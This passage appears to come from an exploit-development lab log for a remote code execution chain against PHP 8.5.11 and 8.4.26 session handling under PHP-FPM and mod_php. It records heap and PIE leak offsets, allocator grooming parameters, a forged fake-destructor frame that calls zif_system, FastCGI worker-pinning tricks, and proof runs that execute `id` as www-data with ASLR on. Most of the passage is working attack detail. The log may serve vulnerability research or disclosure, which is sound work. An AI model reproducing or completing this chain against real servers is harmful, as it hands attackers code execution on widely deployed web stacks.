shifts the whole request heap by at least the output buffer.

Re-running the same A/B on `php:8.5.11-fpm` with
`php-fpm -F -c /usr/local/etc/php/php.ini-production`:

```
A=http 500 (4M OOM), v5 hex=24690 (12345 bytes), other v0..v11 = 8176
raw[0x18]  = 0x71146c05c428   [anon:zend_alloc] 71146c000000-71146c200000
raw[0xff8] = 0x71146c05c100
raw[0x3008]= 0x5da115dc9777
maps ELF base = 0x5da115600000 -> 0x5da115dc9777 - base = 0x7c9777
d = leaked + 0x15cbd8 = 0x71146c1b9000
```

So the heap+PIE leak is verified end-to-end on the stock release image with
ASLR on. Requirement: the target runs `php.ini-production` (or any ini with
the same request-start allocation profile); a target with no active ini needs
its own `pre`/string-bin calibration, since the built-in defaults move the
dtor block by at least the 4 KB output buffer.

Next: stage 2 with the leaked values (the in-band `zif_system` chain needs
`d` and the PIE base; the leak and exploit pairs must share the worker, which
the single-worker lab already enforces).

### Round 36.3 — native pDestructor install + forged frame (probe-assisted proof)

The leak-derived stage 2 now installs and fires the fake destructor.

- The E0 dtor entry (`d+0x800`, `used_slots=-103501`) writes at `arr+0x30`,
  the session Hashtable's real `pDestructor` slot; the probe reads it back as
  `zif_system` (`pd=0x555555a0e3a0`). The E1 entry (`d+0x908`, `-103519..`)
  writes the `+0x18/+0x28/+0x38/+0x48` slots.
- The fake `pDestructor` is invoked from `zend_hash_update` during the session
  var set (not `zend_hash_destroy`), with `rdi` = the session arData. Writing
  the Round 16 frame at `rdi` (num_args=1 at +0x2C, arg0 at +0x50, type 6 at
  +0x58, fake zend_string/command at +0xE0, NUL terminator, scratch
  return_value) plus `set follow-fork-mode parent` yields
  `system("id > /tmp/fpm5_proof")` and `uid=33(www-data)`.
- Frame-field provenance: the userland controls the session zvals (value/type)
  and key strings, but `num_args` (+0x2C) is the next zval's `u2.extra`,
  `arg0` (+0x50) is the following bucket's `h`, and the arg type (+0x58) is
  that bucket's key pointer low byte. Those are engine-derived, so this frame
  cannot be assembled from `$_SESSION` values alone; the no-gdb path needs a
  different destructed-bucket shape (or a userland-controllable frame site).
- The real-image (`php:8.5.11-fpm`, ASLR on, production ini) no-gdb run currently
  stops earlier: the leak parser does not see the expected `v5` heap pointer
  (`[leak] FAILED`) with the 87-byte leak session file; the 10-byte
  `p|i:12345;` file is the proven leak input for the release image (Round 36.2).

### Round 36.4 — no-gdb frame boundary (evidence)

Verified negative results for the userland frame:

- Bucket-val frame fields are engine-shaped: the session zvals' `u2.extra` is
  `0xffffffff` (probe: bucket dump), the `h` slots are key hashes
  (`0x800000000002b60x`), the key slots are heap `zend_string*`. `num_args`,
  `arg0`, and the arg type at `+0x2C/+0x50/+0x58` therefore cannot be supplied
  through `$_SESSION` values or keys.
- The arData redirect is transient: the a-value write at `HT+0x10` reads back
  `har=0x...f0e00` at the SET, but every `zend_hash_find` during
  `php_session_normalize_vars` sees `ar=0x...d7c0` again; `zend_hash_update`
  rebuilds the bucket array during the same decode. Writing the arData last does
  not help: the following set's update resets it before the destroy.
- `ref_props` is not a fake-table path: `php_var_unserialize_destroy` logs
  `level=2` for both exploit decodes, and the last destroy's `ref_props` is
  `0x...c320` (the session HT field written by our dtor entries), not the fill
  table at `d+0xE00`.

Working end state remains the probe-assisted one: E0 installs `zif_system` at
the session HT's `pDestructor`; the destroy fires; the Round 16 frame at `rdi`
with `follow-fork-mode parent` yields `uid=33`.

Open options for the no-gdb frame, in order of evidence:
1. A destructor call site whose `zval*` argument is fill-resident (e.g. a
   reference/array zval whose target is the `d+0xE00` fill area), instead of a
   bucket val.
2. A session-var set order that leaves the redirected arData in place at
   destroy time (needs a set path that does not rehash, e.g. a packed/static
   hash write).
3. An engine field combination that already forms a valid `execute_data`
   (`num_args=1` never occurs naturally: observed `0xffffffff`).

### Round 36.5 — option 3 disproven; the no-gdb frame needs zend_hash internals

With the fake-dtor writes redirected into the fill (`--noht`, `PROBE` still
active), each session value type was decoded and its bucket dumped:

- strings: `vt=6` buckets, `u2.extra = 0xffffffff`
- arrays: `vt=7` (+ an `IS_PTR` 16 helper), same `0xffffffff`
- longs/doubles/bools: decode until the update path crashes; the leak B's
  long buckets are the only ones dumped

`num_args` reads the next zval's `u2.extra` and was never `1`; the bucket's
`h`/`key` are engine-derived. Option 3 (a natural frame shape) is disproven.
Option 1 (fill-resident destructor argument) is impossible because
`pDestructor(&p->val)` always passes the bucket address. Option 2 (arData
redirect) survives the decode under the six-value layout but dies in
`zend_hash_find`: the fake table lacks the engine's hash-slot area
(`arData - nTableSize*4`), the matching `nTableMask`/bucket chain, and the
fill (8170 bytes) cannot hold a 16-slot table plus the frame.

Verified end state remains the probe-assisted chain: leak -> userland fake
`pDestructor` -> `zend_hash_destroy` -> forged frame -> `uid=33`.

### Round 36.6 — option 2 sequencing constraint (watchpoint data)

Watchpoint on the live session array's `arData` field, filtered to the exploit
decode:

```
SET#12..#17  arr=0x7ffff625c310   (all six exploit sets)
_zend_new_array_0 / track-init     (creates 0x7ffff625c1c0)
normalize find ht=0x7ffff625c1c0  ar=0x7ffff625d2c0
```

The redirect lands on the c310 array and survives the sets (har=f0e00 from
SET#14 on; pDestructor becomes zif_system at #16), but `php_session_track_init`
then replaces `PS(http_session_vars)` with the c1c0 array, whose arData is the
engine's d2c0. All six sets are pre-track-init; the normalize finds run on
c1c0. So option 2 needs a write primitive after `php_session_track_init`; no
`$_SESSION` set in this flow provides one. The `zend_hash_packed_to_hash`
conversion during the sets is the other arData write observed.

Verified unchanged: probe-assisted chain -> uid=33; userland leak and
pDestructor install; no-gdb frame blocked on this sequencing, not on the fake
table layout (already built at d+0xE80 with slots -10..-6).

## Round 37 — FPM 8.5.11 native no-gdb RCE (2026-10-27)

The no-gdb frame is closed. `MODE=nogdb IMAGE=php:8.5.11-fpm SESS_MODE=nogdb
bash fpm/run_native.sh` returns `uid=33(www-data)` with ASLR on, stock
`php.ini-production`, one worker, no gdb, 3/3 runs. `/tmp/fpm5_proof` is written
by `zif_system` with `rdi` pointing at the fill fake table (`d+0xE80`).

### 37.1 The baseline fill had two bugs

- The fake-table key pointers used `d-0x15cbd8` as the base, but the session key
  strings stay at the leaked-heap layout while `d` drifts by `0x37000` after a
  leak pair. The handoff's offsets are from the leaked heap; the builder now
  takes `--heap` and uses it for the keys.
- The old E1 six-value option-2 layout crashes in `php_session_encode`: the
  array's `nNumUsed` is 7/8 while the fake table has five valid buckets, so the
  encoder iterates bucket 2 with key `0x6` (the frame arg-type write) and dies
  in `zend_hash_find`. The encoder runs at the upload-progress flush, before
  the track-init destroy. This is why the probe-assisted option-2 run never
  reached `DEST ... ZIF!` here.

### 37.2 E0 two-value userland pDestructor install (probe proof)

E0 at `d+0x800` with `used_slots=-103502` targets `HT+0x20` (nTableSize) for
value 1 and `HT+0x30` (pDestructor) for value 2. Session
`a|i:8;b|i:ZIF;`: the first update initializes the array, the second writes
`pDestructor` after init. Probe: `SET#13 ... pd=0x555555a0e3a0`,
`DEST ht=...c310 pd=zif ZIF!`, `FRAMEWRITE`, `uid=33`. This is the
`SESS_MODE=single_e0` path; it confirms the post-init write without the fake
table.

### 37.3 No-gdb frame layout

- E0 prelude (`used_slots=-132`): p1..p4 target `d-0x30..d+0x00`; p5 targets
  `d+0x10` (last_dtor) with the E2 address. p4 must be `d+0x38` (the entries
  block): `php_var_unserialize` dereferences `d->last` (`d+0x00`) at every
  call, and a small value there crashes at `php_var_unserialize+0xf`
  (`mov (%rbx),%rbp`).
- E2 at `d+0xA00` (`used_slots=-103535`): p6 `HT+0x10` = `d+0xE80` (arData),
  p7 `HT+0x20` = 16 (nTableSize), p8 `HT+0x30` = `zif_system`.
- The array has five elements before p6, so p6..p8 append to buckets 5..7;
  the frame in buckets 0..2 is not overwritten.
- Fake table at `d+0xE80`: bucket 0 `opline=0/call=1/h=0/key=0` (key 0 makes
  the encoder skip it and leaves `func=0`), bucket 1 `Z_NEXT=1` (num_args),
  bucket 2 `h=d+0xFB0` (command zend_string) and `key=d+0x106` (fake
  `zend_string "c"`; low byte 6 is the arg type), bucket 2 val type IS_NULL.
- The destroy at the second `php_session_track_init` calls
  `pDestructor(&bucket0.val)`. `probe-noframe.gdb` logs
  `ZIFENTER rdi=0x...E80`, `F2c=0x2b60700000001` (num_args=1),
  `F50=0x...FB0`, `F58=0x...106`, then `php_exec` writes the proof and the
  worker SIGSEGVs after the command.

### 37.4 Control

`MODE=nogdb IMAGE=php:8.5.12-fpm SESS_MODE=nogdb` fails at the leak stage
(`[leak] FAILED`); the 8.5.12 bailout fix removes the priming step.

Files: `fpm/mk_native_fill.py` (`--heap`, `--e0`, `--nogdb`), `fpm/run_native.sh`
(`SESS_MODE=nogdb|single_e0|nogdb_pre`), `fpm/probe-noframe.gdb`,
`fpm/probe-norm.gdb`. Regression oracle: `MODE=gdb PROBE=probe-ht.gdb
SESS_MODE=single_e0`.

### Round 37.5 — multi-worker FPM (deterministic)

`POOL_CONF=zz-multi.conf PINS=3` runs a 4-worker static pool. The pins are
truncated FastCGI STDIN records (header declares 0xFFF8 bytes, only the
multipart prefix is sent), so the workers block in the body read; a completed
multipart prefix alone let the request finish with 200 and did not pin. A
concurrent `slow.php` test serialized two requests on one worker (4.0 s, same
PID).

With the pins holding three workers, the A and B land on the same free worker
(FPM access log `%p`: A and B both PID 10). The multi pool's ASLR ranges differ
from the single lab: PIE `0x62d6...`, heap `0xb3a...`; the leak parser's
`0x50..0x5f`/`0x70..0x7f` checks rejected the valid B response. The parser now
accepts any PIE ending `0x777` and any heap pointer ending `0x428` in the user
range. The free worker's leak layout is shifted; a `pre` sweep (A's
`fpm_sess_split2.php?pre=N&pad=1490900&hole=4096`) found `PRE=25500`
(heap `...5c428`, PIE `...c9777`). `PRE` defaults to 25500 for the multi pool
and 24576 for the single pool. `LEAK_TRIES=3` covers transient misses.

Result: 5/5 native RCE runs on the 4-worker pool with ASLR on. An opt-in
`STATUS_CHECK=1` readiness probe works (`active=4 idle=0`) but the status
request perturbs the free worker's leak layout, so it is off by default.

## Round 38 — 8.4.26 FPM calibration (in progress)

Pulled `php:8.4.26-fpm`; built `p2s-fpm-gdb:8426`. The 8.4.26 globals and
struct offsets match 8.5.11: `basic_globals` +0x350/+0x368/+0x370,
`ps_globals` +0x168, `php_unserialize_data` 0x2018. The A OOM and the B
stale-`d` reuse work (`d=0x7ffff63f1000`, level 2).

Measured on the 8.4.26 single worker with the 8.5.11 leak A/B:

```
SET#1 a=12345  d=0x7ffff63f1000  ld=0x7ffff6276000  tgt=0x7ffff6275020
v5 zend_string  str=0x7ffff6287000  lenaddr=0x7ffff6287010  len=4088
gap target -> v5 len: 0x11FF0
```

The B's `v5` string is above the A's dtor target. Sweeps that did not forge
`v5` (it stayed at the normal 2*vlen hex):

- `pre` 24576..29696 step 8, and 98000..99000 step 8
- `pad` 1564000..1565600 step 8
- `hole` 73000..74500 step 8
- B `vlen` 2600..4088 step 8

The 8.4.26 A's `d-ld` delta is 0x17B000 versus 0x132000 on 8.5.11, so the
allocator layout inside the A's `sess_A` decode differs. The outer
`pre`/`pad`/`hole` and the B's `vlen` do not move the dtor target enough.
Next: trace the A's `d`/dtor allocations and the B fill's `d`/`last_dtor`
placement, and recalibrate the A's session/decode or the B fill count rather
than the outer allocations.

### Round 38.1 — A-side init/bail trace

`probe-8426.gdb` now logs `php_var_unserialize_init` and `_zend_bailout`:

```
INIT lock=0 level=0 data=0x0
BAIL lock=0 level=1 data=0x7ffff63f1000   (x3)
INIT lock=0 level=1 data=0x7ffff63f1000   (B reuse)
SET#1 a=12345 d=0x7ffff63f1000 ld=0x7ffff6276000 tgt=0x7ffff6275020
v5 lenaddr=0x7ffff6287010
```

The A's `php_set_session_var` for the `sess_A` record never runs: the OOM
lands inside the array decode, so the `last_dtor` block
(`0x7ffff6276000`) is allocated by that decode. The B reuses it correctly.
The remaining gap is `0x11010` from the A's dtor block to the B's `v5`
string (`0x11FF0` from the write target). The 8.4.26 `d-ld` delta is
`0x17B000` versus `0x132000` on 8.5.11.

Outer `pre`/`pad`/`hole` and B `vlen` are ruled out. Next: vary the
`sess_A` array size/type and trace the A dtor allocation, or trace
`tmp_var` during the A array decode; the dtor block placement, not the outer
allocations, is the lever.

### Round 38.2 — sess_A size variants

Generated `sess_A_80000` through `sess_A_130000` (1.26 to 2.12 MB; the
original is 1.19 MB). Each A returned 500 and each B returned the normal
`v5` length 8176 (4088 bytes). The array size does not move the A's dtor
block enough to close the `0x11010` gap. The dtor block remains at
`0x7ffff6276000`; the B's `v5` lenaddr remains `0x7ffff6287010`.
Next: change the `sess_A` element type (refcounted strings/arrays) or the
B's GET layout before `v5`; the outer size, `pre`, `pad`, `hole`, and `vlen`
levers are ruled out.

### Round 38.3 — GET value map and v1 target

`probe-8426.gdb` now prints every GET value:

```
v0 lenaddr=0x7ffff6273010   v1 lenaddr=0x7ffff6277010
v2 lenaddr=0x7ffff627b010   v3 lenaddr=0x7ffff627f010
v4 lenaddr=0x7ffff6283010   v5 lenaddr=0x7ffff6287010
v6..v11 0x7ffff628b010..0x7ffff62a4010
```

The A's write target `0x7ffff6275020` is between `v0` and `v1`; the `v1`
length is `0x7ffff6277010`, `0x1FF0` above the target. A `pre` sweep
31000..34000 step 8 produced no forged `vN`. The A dtor block is
`0x7ffff6276000`; the `v1` string is `0x7ffff6277000`; the target is
`0xFE0` below the dtor and `0x1FF0` below `v1`.

Outer `pre`/`pad`/`hole`, the `sess_A` size, and the B `vlen` are ruled out.
Next: trace `var_tmp_var`/`tmp_var` during the A array decode to locate the
dtor block allocation; move that block, not the outer allocations.

## Round 39 — cookie-off FPM (`session.use_cookies=0`)

The `Set-Cookie` leak is gone when cookies are disabled. Added `www/sid.php`
(`session_start(); echo "SID:", SID;`) and `fpm/zz-cookieoff.conf`
(`session.use_cookies=0`, `session.use_only_cookies=0`,
`session.use_trans_sid=1`); `fcgi_split.py` gained `SID_GET=1` to put the
session id in the query string.

8.5.11 probe result:

```
A=500
B SID:PHPSESSID=22222222222222222222222222222222
SET#1..#5 d=0x7ffff63bd000  ld=0x7ffff6288000  us=-255..-251
VDEST d=0x7ffff63bd000 level=2
SET#12..#16 d=0x7ffff62da000 ld=0x7ffff62dd000 us=1..5
VDEST d=0x7ffff62da000 level=1
```

The A OOM leaves the stale `d` (`0x7ffff63bd000`); the upload-progress
decodes reuse it (level 2). The `sid.php` `session_start` then allocates a
fresh `d` (`0x7ffff62da000`, level 1), so the `SID` output stays normal
(41 chars). The `SID` sink itself is reachable; the page just does not use the
stale `d` for the echo.

Next: use `SID` without a second `session_start` (the upload-progress callback
already activated the session), so the echo reads the stale `PS(id)`/`d`, or
find another cookie-off response sink.

### Round 39.1 — SID without session_start; A-id request

`www/sid.php` now echoes `SID` without a second `session_start()`. With the B
request using the A's session id, the output is:

```
SID:PHPSESSID=11111111111111111111111111111111
```

The sink reads the A's `PS(id)`, but the B's session decode used a fresh `d`
(`0x7ffff63f4000`, level 2), not the A's stale `d` (`0x7ffff63bd000`). The
`SID` length stayed normal (41 chars). The stale `d` was not reused by the
script; the A's `send_cookie=0` path also changes the A-side OOM/prime.

Next: make the B's session decode reuse the A's stale `d` (same session id,
`BG(unserialize).level=1` at the callback) or read `SID` while the stale `d`
is still live. The `SID` sink itself is proven.

### Round 39.2 — cookie-off stale d reuse confirmed

With the cookie-off pool and the B using the A's session id:

```
A INIT lock=0 level=0 data=0x0
A BAIL lock=0 level=1 data=0x7ffff63bd000   (x3)
B INIT lock=0 level=1 data=0x7ffff63bd000   (reuse)
B VDEST level=2
B INIT lock=0 level=1 data=0x7ffff63bd000   (reuse)
B SET#1 upload_progress_x d=0x7ffff63bd000 us=-255 tgt=0x7ffff6287020
B VDEST level=2
SID:PHPSESSID=11111111111111111111111111111111
```

The B does reuse the A's stale `d`; the earlier fresh `d` runs were the
`sess_LB`/different-sequence case. The `SID` output is the normal 41 chars,
so the `upload_progress_x` write target (`0x7ffff6287020`) is not the
`SID`/`PS(id)` zend_string length. Next: locate the `SID` string address and
align the first write target with its length field.

### Round 39.3 — SID constant is IS_PTR

`probe-8426.gdb` watches `zend_hash_find` for the `SID` constant:

```
SIDRET z=0x55555727d260 type=13
SIDRET z=0x55555727d260 type=13
```

The `SID` constant is a type-13 `IS_PTR`, not a direct `IS_STRING`; the
`SID` output is the normal A id. The write target `0x7ffff6287020` is not the
`SID` length. Next: dereference the type-13 pointer (or read `PS(id)` at
`ps_globals+0x10`) to get the `SID`/PS string length address and align the
first write target with it.

### Round 39.4 — PS(id) length address

```
PSID  id=0x7ffff626a000
PSIDSTR id=0x7ffff626a000 lenaddr=0x7ffff626a010 len=0x20
        data=b'11111111111111111111111111111111'
SIDPTR rv=0x55555727d260 ptr=0x7ffff6256258
SIDPTRSTR ptr len=0x7ffff62575e0   (not a zend_string)
SET#1 upload_progress_x tgt=0x7ffff6287020
```

The `PS(id)` string length is at `0x7ffff626a010`; the upload-progress write
target is `0x7ffff6287020`, a `0x1D010` gap. The SID `IS_PTR` points at a
zval/session-id structure, not a zend_string, so the SID output length is not
directly at that pointer.

Next: align the first write target with the `PS(id)` length
(`0x7ffff626a010`) or the SID output string length; the A's d/ld or the B's
request layout is the lever.

### Round 39.5 — qpad after PHPSESSID does not move PS(id)

`qpad=118800` (`0x1D010`) with `SID_GET=1`:

```
PSIDSTR id=0x7ffff626a000 lenaddr=0x7ffff626a010 len=0x20
B body: (empty; no SID line)
```

The qpad value is placed after `PHPSESSID` in the query, so `PS(id)` is
allocated first and stays at `0x7ffff626a000`; the large `q` value also makes
the `SID` page return an empty body. The write target remains
`0x7ffff6287020`.

Next: put the qpad/query padding before `PHPSESSID` (so it shifts the
`PS(id)` allocation), or move the A's dtor target instead.

### Round 39.6 — qpad before PHPSESSID still does not move PS(id)

Reordered the query so the `q` padding precedes `PHPSESSID`:

```
PSIDSTR id=0x7ffff626a000 lenaddr=0x7ffff626a010 len=0x20
B body: (empty; no SID line)
```

`PS(id)` is unchanged, and the 118800-byte `q` value leaves the `SID` page
with an empty body. The large single query value is not a viable shift for
the PS(id) allocation. Next: use a different allocation before the session
id (many small query values or the A's d/ld) rather than one large q value.

### Round 39.7 — many query values before PHPSESSID

`n2p=29`, `nvars=31`, `vlen=4088` with the query padding before `PHPSESSID`:

```
PSIDSTR id=0x7ffff626a000 lenaddr=0x7ffff626a010 len=0x20
B response file: missing (query rejected/empty)
```

`PS(id)` is unchanged and the B response is empty. The GET query values do
not move the `PS(id)` allocation; the session id is allocated by the
`early_find_sid`/session path independently of the query padding. The write
target remains `0x7ffff6287020`.

Next: use the A's d/ld target instead of shifting `PS(id)`, or find another
cookie-off sink whose length is within reach of the write.

### Round 39.8 — sess_A size moves the A d, not PS(id)

With `sess_A_90000`:

```
A 500
BAIL level=1 data=0x7ffff63f4000   (vs 0x7ffff63bd000)
B INIT level=1 data=0x7ffff63f4000 (reuse)
PSIDSTR id=0x7ffff626a000 lenaddr=0x7ffff626a010 len=0x20
SID:PHPSESSID=11111111111111111111111111111111
```

The `sess_A` size moves the A's stale `d`, but `PS(id)` is fixed at
`0x7ffff626a000` and the SID output stays normal. The `PS(id)` allocation is
independent of the A-side session record. Next: use the A d/ld target to hit
the `PS(id)` length, or a different cookie-off sink.

### Round 39.9 — sess_A 80k/90k jump layouts

`sess_A_80000` and `sess_A_90000` both produce:

```
A d=0x7ffff63f4000
B SET#2 upload_progress_x ld=0x7ffff63f7000 us=2 tgt=0x7ffff63f7030
PSIDSTR lenaddr=0x7ffff626a010
```

The target is above `PS(id)` by `0x18D020`. The original 1.19 MB record
(target `0x7ffff6287020`, gap `0x1D010`) is the closest layout. The `sess_A`
size jumps between allocator layouts rather than moving the target smoothly.
Next: `pre`/`pad`/`hole` on the original record, or another cookie-off sink.

### Round 39.10 — pre=143376 does not move the cookie-off target

```
A 500
B SID:PHPSESSID=11111111111111111111111111111111
PSIDSTR lenaddr=0x7ffff626a010
```

No `SET#` write target appeared for the B; `PS(id)` is unchanged. The A-side
`pre` lever does not move the cookie-off SID target. The SID sink remains
proven, but the `PS(id)` length is out of reach of the current write.

Recommendation: stop the cookie-off blind sweep and move to the mod_php
path1 HTTP-only fake-block/leak work or the FPM serializer variants.

## Round 40 — FPM serializer variants (setup)

Added `fpm/zz-phpser.conf` (`session.serialize_handler=php_serialize`) and
`fpm/payload/sess_LB_phpser` (123 bytes,
`a:5:{s:1:"a";i:12345;...}`). The A's 1.19 MB `php_serialize` session file was
not written by the host CLI (`/usr/bin/php` 8.4.27) from
`$_SESSION['p']=range(0,74999)`; only the small B file was created. The
`p2s-phpser` container also failed to start because port 9003 is held by the
cookie-off lab, so the A/B ran against the old container (A=200, normal `v5`).

Next:
1. Free port 9003 / remove the old cookie-off container.
2. Generate the A's `php_serialize` file through the container's `fpm_sess.php`
   (post a serialized `range` array) rather than the host CLI.
3. Rerun with `zz-phpser.conf` and `probe-8426` to compare `INIT`/`SET`/`VDEST`
   and the `d`/`used_slots` behavior with the `php` serializer.
4. Then repeat for `php_binary` (`sess_A` = `\x01p` + serialized array,
   `sess_LB` = length-prefixed keys/values).

mod_php path1 (fake-block/leak) is next after the serializer setup; it needs
the path1 target and the fake-block groom embed.

### Round 40.1 — php_serialize A/B runs

Generated the A's 1.18 MB `php_serialize` record through `fpm_sess.php`
(posted `serialize(range(0,74999))`):

```
/tmp/sess_A: 1177804 bytes
a:1:{s:1:"p";a:75000:{i:0;i:0;...
```

A run (OOM) and B run (upload-progress with `sess_LB_phpser`):

```
INIT level=0 data=0
BAIL level=1 data=0x7ffff63b6000   (x3)
INIT level=1 data=0x7ffff63b6000   (B reuse)
VDEST level=2
INIT level=1 data=0x7ffff63b6000
VDEST level=2
B v5: normal 4088 (no SET# lines)
```

The `php_serialize` decoder reuses the stale `d` correctly, but the session
values do not reach `php_set_session_var` in this flow (no `SET#`), so the B's
`v5` is normal. Next: trace the `php_serialize` decoder's
`php_var_unserialize`/`tmp_var` path and where it sets session vars; compare
with `php_binary`.

### Round 40.2 — php_serialize decoder path

`PS_SERIALIZER_DECODE_FUNC(php_serialize)` (`session.c:966`) does not call
`php_set_session_var`; it `php_var_unserialize`s the whole record into a zval
and assigns it to `PS(http_session_vars)`. A `var_tmp_var` probe did not fire
during the B, and the B's `v5` stayed normal (4088). The B's
`sess_LB_phpser` read path or the inline `tmp_var` still needs tracing.

Next: verify the B actually reads `sess_LB_phpser` (session status/serialize
handler) and whether `php_var_unserialize` uses the inline `tmp_var` path, or
move to `php_binary` (decoder at `session.c:1022`), whose per-value decode is
closer to the `php` serializer.

### Round 40.3 — php_serialize has no per-value tmp_var

The B now reads `sess_LB_phpser` (the `UNSER` probe shows
`a:5:{s:1:"a";s:4:"AAAA";...}`), but `var_tmp_var` never fires, even with
string values. The `php_serialize` decoder's `php_var_unserialize` does not
provide the per-value `tmp_var` ring that the `php` serializer uses. The B's
`v5` stays normal.

The `php_binary` decoder (`session.c:1022`) calls `var_tmp_var` per value and
is the next serializer variant to test.

### Round 40.4 — php_binary exposes the tmp_var ring

A's `sess_A_bin` (1177792 bytes, `\x01p` + serialized array) generated. The B's
host-generated binary file failed, so the B ran with an empty session. The
probe still shows the ring:

```
TMP vh=0x7fffffffc9b8 d=0x7ffff63b6000 ld=0x7ffff6287000 us=-256 tgt=0x7ffff6286010
UNSER rv=0x7ffff6286010 ...
SET#1 upload_progress_x d=0x7ffff63b6000 ld=0x7ffff6287000 us=-255 tgt=0x7ffff6286020
VDEST ... level=2
```

`php_binary` calls `var_tmp_var` per value and exposes the A's stale
`d`/dtor ring, unlike `php_serialize`. Next: create the B's binary session
manually (`\x01a` + `i:12345;` + `\x01b` + ...) and rerun; this should drive
the session values through the ring.

### Round 40.5 — php_binary B decodes, A does not OOM

Manual B session:

```
\x01a i:12345; \x01b i:12345678901234; ... \x01e i:123456789012345;
```

B probe:

```
TMP d=0x7ffff62a5000 ld=0x7ffff6269000 us=1..6 tgt=0x7ffff6269020..9070
SET#7..#12 a..e, upload_progress_x
VDEST level=1
```

The B's `php_binary` decoder drives the values through `tmp_var`, but the A
returned **200** (no OOM); the 1.18 MB binary record plus the pad did not
exceed 4M, so the A left no stale `d` and the B allocated a fresh one.

Next: generate a larger `sess_A_bin` (e.g., 200k+ ints) or lower the A's
memory limit so the A OOMs; then the B should reuse the stale `d` and the
`SET#`/`tmp_var` ring should target the session values.

### Round 40.6 — php_binary 200k A OOM and stale-d reuse

A's `sess_A_bin_200k` (3377793 bytes, `\x01p` + `a:200000:{...}`):

```
A=500
SET#15..#17 c/d/e d=0x7ffff6268000 ld=0x7ffff62a5000 us=3..5 tgt=0x7ffff62a5040..5060
VDEST d=0x7ffff6268000 level=1
INIT level=0
TMP d=0x7ffff62a5000 ld=0x0
SET#18..#23 a..e/upload_progress d=0x7ffff62a5000 ld=0x7ffff6269000 us=1..6
```

The first B decode (c/d/e) reuses the A's stale `d` and drives `tmp_var` with
`us=3..5`; the second decode allocates a fresh `d` at `0x7ffff62a5000`.
The B's `v5` is still normal. The `php_binary` path is now the closest
serializer variant to the `php` chain: the stale `d` is reused and the ring
fires, but the write target does not reach the `v5` string.

### Round 40.7 — php_binary vlen does not move v5

`vlen=29580` with the 200k binary A:

```
GETV v5 lenaddr=0x7ffff6286010 len=0xff8 (4088)
SET#15 c tgt=0x7ffff62a5040
SET#18 a tgt=0x7ffff6269020
```

The `v5` string is still 4088 bytes; the `vlen` change did not move it. The
first decode target (`0x7ffff62a5040`) is `0x1F030` above the `v5` length;
the second decode target is `0x1CFA0` below it. Next: move the A's d/ld or
use a different GET layout to bring the target onto the `v5` length.

### Round 40.8 — pad does not move the php_binary dtor target

`pad=1363872` (1490900 - 0x1F030):

```
A=500
SET#16 d=0x7ffff6268000 ld=0x7ffff62a5000 tgt=0x7ffff62a5050
GETV v5 lenaddr=0x7ffff6286010
```

The target is unchanged. The pad is a large separate-chunk allocation and
does not move the main-chunk dtor block. Next: `pre`/`hole` on the A, or a
different B GET layout, to close the `0x1F030` gap.

### Round 40.9 — hole does not move the php_binary target

`hole=131120`:

```
A=500
GETV v5 lenaddr=0x7ffff6286010
no SET# lines
```

The A's hole does not move the dtor target or the B's `v5`. The outer
`pre`/`pad`/`hole` levers are ruled out for this alignment. Next: the B's GET
layout (`v5` address) or a different session value/`used_slots` offset; the
`php_binary` path remains the closest.

## Round 41 — path1 gdb pivot re-verified

```
PIVOT ht=0x7624b945b0e0 ad=0x7624b945d400 blk=0x7624b945d3c0 zif=0x7624bb3996e0
php_exec () from /usr/lib/apache2/modules/libphp.so
/tmp/p1hash = uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

`zif = libphp + 0x5996e0`; `blk = arData - 0x40`; the fake HashTable reaches
`zend_hash_destroy` -> `php_exec_ex` -> `php_exec`. The path1 gdb pivot is
confirmed on the 8.5.11 mod_php lab.

HTTP-only still needs the fake block embedded in the 280-byte groom and an
independent chunk/libphp leak. The FPM `php_binary` alignment remains at the
`0x1F030` gap.

## Round 42 — path1 fake block embed (first attempt)

Added `--fake-blk`/`--fake-zif`/`--fake-cmd` to `path1_hash/path1_body.py`;
the groom value becomes the 280-byte fake block at `blk`.

ASLR-off base from the gdb pivot:

```
PIVOT ht=0x7ffff685b0e0 ad=0x7ffff685d400 blk=0x7ffff685d3c0 zif=0x7ffff37996e0
noaslr proof: uid=33(www-data)
```

Embedded body against `setarch -R apache2 -X` (no gdb block write):

```
resp=211 HTTP/1.0 500 Internal Server Error
PHP Fatal error: Allowed memory size ... tried to allocate 16384 bytes in Unknown on line 0
/tmp/p1hash: empty
```

The fake block in all 20 groom values changed the heap; the OOM moved to the
final field (`Unknown on line 0`) and the pivot was not reached. Next: inject
the fake block into only the groom value that reclaims the arData (the last),
preserving the other `C` groom values, and rerun.

### Round 42.1 — last-groom fake block still OOMs at the final field

`--fake-index=-1` (last groom only) with the ASLR-off base:

```
HTTP/1.0 500 Internal Server Error
PHP Fatal error: Allowed memory size ... 16384 bytes ... Unknown on line 0
/tmp/p1hash: empty
```

The OOM site is the same final `files[...]` key; the fake block does not
reach the `$_FILES['X']` arData in this run. Next: verify which groom value
actually reclaims the arData under the ASLR-off groom (gdb `arData` vs raw
buffer address), then place the fake block at that value/offset, not the last
groom by guess.

### Round 42.2 — embedded fake block is not at blk

Embedded-body run, no block write:

```
PIVOT ad=0x7ffff685d400 blk=0x7ffff685d3c0
blk: 0xffffffffffffffff 0xffffffffffffffff ...
ad : 0x00007ffff685b118 0xffffffff00000307 ...
```

The `blk` (arData-0x40) is `0xFF`, not the fake block; `ad` holds only the
caller bucket. The last-groom fake block did not reclaim the arData. Next:
find the groom raw buffer that the `$_FILES['X']` arData actually reuses and
place the fake block at that value/offset, or use a groom value at `ad` if the
block start differs.

### Round 42.3 — groom raw buffer identity: none of the 20 reclaim the arData

Tagged each of the 20 groom values `G00`..`G19` (`--marker`) and ran the
no-write embed probe:

```
PIVOT ad=0x7ffff685d400 blk=0x7ffff685d3c0
blk: 0xFFFFFFFFFFFFFFFF 0xFFFFFFFFFFFFFFFF   (chunk header, not user data)
ad : 0x00007ffff685b118 0xFFFFFFFF00000307   (caller bucket val.ptr + type)
ad+0x10: 0x800000310f703038 0x00007ffff6856360
ad+0x20: 0 0
```

No `G00`..`G19` marker appears anywhere in the block. The `$_FILES['X']`
arData is a fresh 320-byte chunk, not any groom raw buffer. The groom values
are alive in `$_POST`; the arData allocation pops a different free 320 chunk.
Also note `blk=ad-0x40` is the 0x40-byte `zend_mm` chunk header, so the fake
HT's `pDestructor` at `blk+0x30` is outside any user-controlled payload.

Next: (a) extend the marker to the parser's other 280/320-byte allocations
(file-part values/headers) to find the chunk the arData actually reuses, or
(b) place a shifted fake block at the payload start `ad` (`pDestructor` at
